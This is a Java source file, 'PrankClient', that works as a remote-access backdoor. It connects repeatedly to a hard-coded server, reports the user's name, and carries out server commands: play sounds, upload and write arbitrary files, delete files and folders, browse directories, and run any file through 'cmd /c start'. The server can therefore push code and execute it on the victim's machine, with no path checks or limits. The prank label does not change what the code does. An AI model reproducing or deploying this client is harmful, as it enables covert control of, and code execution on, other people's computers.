import java.io.*;
import java.net.Proxy;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

// Press Shift twice to open the Search Everywhere dialog and type `show whitespaces`,
// then press Enter. You can now see whitespace characters in your code.
public class PrankClient {

    private List<String> sounds;

    private void start() throws InterruptedException {
        sounds = new ArrayList<>();
        File file = new File("sounds.txt");
        try {
            Scanner scanner = new Scanner(file);
            String sound;
            while (scanner.hasNext()) {
                sound = scanner.nextLine();
                sounds.add(sound);
                System.out.println(sound);
            }
        } catch (FileNotFoundException e) {
        }
        client();
    }
    private void client() throws InterruptedException {
        Socket socket = getConnection();
        while (socket == null) {
            Thread.sleep(10000);
            System.out.println("Trying Connection Again");
            socket = getConnection();
        }
        listen(socket);
    }

    private void listen(Socket socket) throws InterruptedException {
        PrintWriter out = null;
        File file = new File("");
        String home = file.getAbsolutePath();
        System.out.println(file.getAbsolutePath());
        try {
            out = new PrintWriter((new OutputStreamWriter(socket.getOutputStream())));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        out.printf("name %s\n", System.getProperty("user.name"));
        out.flush();
        out.printf("sounds");
        for (String sound : sounds) {
            out.printf(" %s", sound);
        }
        out.print("\n");
        out.flush();
        Thread pings = new Thread(new Pings(out));
        pings.start();
        while (true) {
            try {
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String input = in.readLine();
                if (input == null) {
                    socket.close();
                    pings.interrupt();
                    Thread.sleep(10000);
                    client();
                }
                System.out.println(input);
                String[] args = input.split(" ");
                if (args[0].equals("play")) {
                    if (args.length == 2 && sounds.contains(args[1])) {
                        MP3 mp3 = new MP3("samples\\" + args[1] + ".mp3");
                        mp3.play();
                    }
                    else {
                        MP3 mp3 = new MP3("samples\\" + args[1] + ".mp3", Integer.parseInt(args[2]));
                        mp3.play();
                    }
                }
                else if (args[0].equals("file")) { //file <add/remove> <type> <name> <length>
                    if (args[1].equals("add") || args[1].equals("remove")) {
                        String path = args[3];
                        if (args[1].equals("add")) {
                            for (int i = 4; i < args.length - 2; i++) {
                                path = path + " " + args[i];
                            }
                        }
                        else {
                            for (int i = 4; i < args.length ; i++) {
                                path = path + " " + args[i];
                            }
                        }
                        File file1 = new File(file.getAbsolutePath() + "\\" + path + "." + args[2]);
                        System.out.println(file1.getAbsolutePath());
                        if (args[1].equals("add") && !file1.exists()) {
                            if (file1.createNewFile()) {
                                if (args[args.length - 2].equals("source")) {
                                    System.out.println("here");
                                    OutputStream outputStream = new FileOutputStream(file1);
                                    InputStream inputStream = socket.getInputStream();
                                    byte[] bytes = new byte[32 * 1024];
                                    int count;
                                    int length = 0, num = 0;
                                    while (length < Integer.parseInt(args[args.length - 1])) {
                                        num++;
                                        count = inputStream.read(bytes);
                                        length = length + count;
                                        System.out.println(length);
                                        outputStream.write(bytes, 0, count);
                                        if ((num % 20) == 0) {
                                            out.println("file uploading");
                                            out.flush();
                                        }
                                    }
                                    outputStream.close();
                                    out.println("file good add");
                                    out.flush();
                                } else {
                                    PrintWriter write = new PrintWriter(new FileWriter(file1));
                                    for (int i = 0; i < Integer.parseInt(args[args.length - 1]); i++) {
                                        String string = in.readLine();
                                        string = string.replaceAll("\\\\n", "\n");
                                        System.out.println(string);
                                        write.print(string + " ");
                                        write.flush();
                                    }
                                    write.close();
                                    out.println("file good add");
                                    out.flush();
                                }
                            } else {
                                out.println("file err cant_make");
                            }
                        } else if (args[1].equals("remove") && file1.exists()) {
                            System.out.println(file1.getAbsolutePath());
                            if (file1.delete()) {
                                out.println("file good remove");
                                out.flush();
                            } else {
                                out.print("file err not_exits");
                                out.flush();
                            }
                        }
                        else if (file1.exists()) {
                            out.println("file err exists");
                            out.flush();
                        }
                        else {
                            out.println("file err not_exists");
                            out.flush();
                        }
                    }
                    else if (args[1].equals("mkdir")) {
                        System.out.println("mk");
                        String path  = args[2];
                        for (int i = 3; i < args.length; i++) {
                            path = path + " " + args[i];
                        }
                        File file1 = new File(file.getAbsolutePath() + "\\" + path);
                        if (file1.exists()) {
                            out.println("file err exists");
                            out.flush();
                        }
                        else {
                            if (file1.mkdir()) {
                                out.println("file good add");
                                out.flush();
                            }
                            else {
                                out.println("file err cant_make");
                                out.flush();
                            }
                        }
                    }
                    else if (args[1].equals("rmdir")) {
                        System.out.println("rm");
                        String path  = args[2];
                        for (int i = 3; i < args.length; i++) {
                            path = path + " " + args[i];
                        }
                        File file1 = new File(file.getAbsolutePath() + "\\" + path);
                        if (!file1.exists()) {
                            out.println("file err not_exists");
                            out.flush();
                        }
                        else {
                            if (file1.delete()) {
                                System.out.println("Deleted");
                                out.println("file good remove");
                                out.flush();
                            }
                            else {
                                System.out.println("Not deleted");
                                out.println("file err cant_delete");
                                out.flush();
                            }
                        }
                    }
                }
                else if (args[0].equals("pwd")) {
                    String temp = "filepath " + file.getAbsolutePath();
                    sendMsg(temp, out);
                }
                else if (args[0].equals("ls")) {
                    File file1 = new File(file.getAbsolutePath());
                    String[] names = file1.list();
                    String temp = "filelist ";
                    for (int i = 0; i < names.length; i++) {
                        names[i] = names[i].replaceAll(" ",  "\\\\32");
                        System.out.println(names[i]);
                        temp = temp + names[i] + " ";
                    }
                    temp = temp + "\n";
                    sendMsg(temp, out);
                }
                else if (args[0].equals("cd")) {
                    String path;
                    if (args.length == 1) {
                        File file2 = new File(home);
                        file = file2;
                        out.println("cd");
                        out.flush();
                    }
                    else {
                        input = args[1];
                        for (int i = 2; i < args.length; i++) {
                            input = input + "\\32" + args[i];
                        }
                        System.out.println(input);
                        String[] cd = input.split("/");
                        for (int i = 0; i < cd.length; i++) {
                            path = file.getAbsolutePath();
                            if (cd[i].equals("..")) {
                                path = path.substring(0, path.lastIndexOf("\\"));
                                if (!path.contains("\\")) path = path + "\\";
                                file = new File(path);
                                System.out.println(file.getAbsolutePath());
                            } else {
                                cd[i] = cd[i].replaceAll("\\\\32", " ");
                                path = path + "\\" + cd[i];
                                File file2 = new File(path);
                                System.out.println(file2.getAbsolutePath());
                                if (file2.exists()) file = file2;
                                else break;
                            }
                        }
                        out.println("cd");
                        out.flush();
                    }
                }
                else if (args[0].equals("sound")) {
                    String path  = args[2];
                    for (int i = 3; i < args.length - 1; i++) {
                        path = path + " "  + args[i];
                    }
                    if (args[1].equals("add")) {
                        File newMp3 = new File("samples\\" + path + ".mp3");
                        if (newMp3.exists()) {
                            sendMsg("sound err exists", out);
                        }
                        else {
                            if (!newMp3.createNewFile()) {
                                sendMsg("sound err fail_create", out);
                            }
                            else {
                                OutputStream outputStream = new FileOutputStream(newMp3);
                                InputStream inputStream = socket.getInputStream();
                                byte[] bytes = new byte[32*1024];
                                int count;
                                int length = 0, num = 0;
                                while (length < Integer.parseInt(args[args.length - 1])) {
                                    num++;
                                    count = inputStream.read(bytes);
                                    length = length + count;
                                    outputStream.write(bytes, 0, count);
                                    if ((num % 10) == 0) {
                                        out.println("file uploading");
                                        out.flush();
                                    }
                                }
                                System.out.println("Done");
                                outputStream.close();
                                if (newMp3.exists()) {
                                    try {
                                        File soundlist = new File("sounds.txt");
                                        BufferedWriter writer = new BufferedWriter(new FileWriter(soundlist, true));
                                        writer.write(path);
                                        writer.newLine();
                                        writer.close();
                                        sounds.add(path);
                                        sendMsg("sound good add " + path, out);
                                    }
                                    catch (NullPointerException e) {
                                        System.out.println("Here1");
                                        sendMsg("sound err corrupt", out);
                                    }
                                }
                                else  {
                                    System.out.println("Here2");
                                    sendMsg("sound err corrupt", out);
                                }
                            }
                        }
                    }
                    else {
                        if (sounds.contains(path)) {
                            Scanner scanner = new Scanner(new File("sounds.txt"));
                            String string;
                            List<String> temp = new ArrayList<>();
                            while (scanner.hasNext()) {
                                string  = scanner.nextLine();
                                if (!string.equals(path)) temp.add(string);
                            }
                            PrintWriter write = new PrintWriter(new FileWriter("sounds.txt"));
                            for (int i = 0; i < temp.size(); i++) {
                                write.println(temp.get(i));
                                write.flush();
                            }
                            write.close();
                            sendMsg("sound good remove " + path, out);
                            File remove = new File("samples\\" + path + ".mp3");
                            remove.delete();
                        }
                        else sendMsg("sound err not_exist", out);
                    }
                }
                else if (args[0].equals("run")) {
                    String path = args[1];
                    File file3;
                    String temp = "";
                    for (int i = 2; i < args.length; i++) {
                        path = path + " " + args[i];
                    }
                    if (path.contains(":")) file3 = new File(path);
                    else {
                        file3 = new File(file.getAbsolutePath() + "\\" + path);
                    }
                    if (!file3.exists()) {
                        out.println("file err not_exists");
                        out.flush();
                    }
                    else {
                        String[] cmdArray = {"cmd", "/c", "start", "\"\"", file3.getAbsolutePath(), "exit"};
                        Process proc = Runtime.getRuntime().exec(cmdArray);
                        out.println("file good run");
                        out.flush();
                    }
                }
            } catch (IOException e) {
                pings.interrupt();
                Thread.sleep(10000);
                client();
            }
        }
    }

    private static class Pings implements Runnable {
        PrintWriter out;
        public AtomicBoolean run;
        private Pings(PrintWriter out) {
            this.out = out;
            run = new AtomicBoolean(true);
        }
        @Override
        public void run() {
            while (run.get()) {
                sendMsg("ping", out);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    return;
                }
            }
        }
        public synchronized void sendMsg(String msg, PrintWriter out) {
            out.println(msg);
            out.flush();
        }
    }

    private Socket getConnection() {
        try {
            Socket socket = new Socket("test.server.ca", 8888);
            return socket;

        } catch (IOException e) {
            return null;
        }

    }
    public synchronized void sendMsg(String msg, PrintWriter out) {
        out.println(msg);
        out.flush();
    }
    public static void main(String[] args) throws IOException {
        PrankClient client = new PrankClient();
        try {
            client.start();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

}